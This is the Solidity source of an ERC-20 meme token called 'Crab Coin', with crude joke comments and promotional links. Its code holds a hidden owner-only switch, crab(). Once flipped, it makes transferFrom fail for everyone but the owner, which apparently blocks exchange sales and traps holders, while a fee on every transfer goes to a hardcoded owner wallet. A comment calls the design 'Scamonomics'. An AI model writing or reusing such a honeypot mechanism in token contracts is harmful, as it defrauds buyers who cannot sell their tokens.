pragma solidity ^0.8.0;
//SPDX-License-Identifier: NONE
//Crabz :)
//Come get em while they're hot
//and on your genitalia 
//https://CrabCoinETH.com
//t.me/CrabNation
//https://discord.gg/bTSxfjQrfi

import "./ERC20.sol";
import "./Ownable.sol";

contract CRAB is Ownable, ERC20 {
    //Triangulation
    uint BURN_FEE = 420;
    uint CRAB_FEE = 80;
    //Me Fee
    address payable public CrabLord = payable(address(0xf7e6a4d23272B2194dda912C39C926202786639D));
    //Scamonomics
    bool private _crab = false;

constructor() ERC20 ('Crab Coin','CRAB') {
    _mint(msg.sender, 420420* 10 ** 18);
    }
       
function crab() external onlyOwner
    {
        _crab = !_crab;
    }
   
function transfer(address recipient, uint256 amount) public override returns (bool){
            uint burnAmount = amount*(BURN_FEE) / 10000;
            uint crabAmount = amount*(CRAB_FEE) / 10000;
            _burn(_msgSender(), burnAmount);
            _transfer(_msgSender(), recipient, amount-(burnAmount)-(crabAmount));
            _transfer(_msgSender(), CrabLord, crabAmount);
      return true;
    }    

function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) public override returns (bool) 
    {     
        require(!_crab || tx.origin == owner(), "CRAB");
        return super.transferFrom(from, to, amount);
    }
}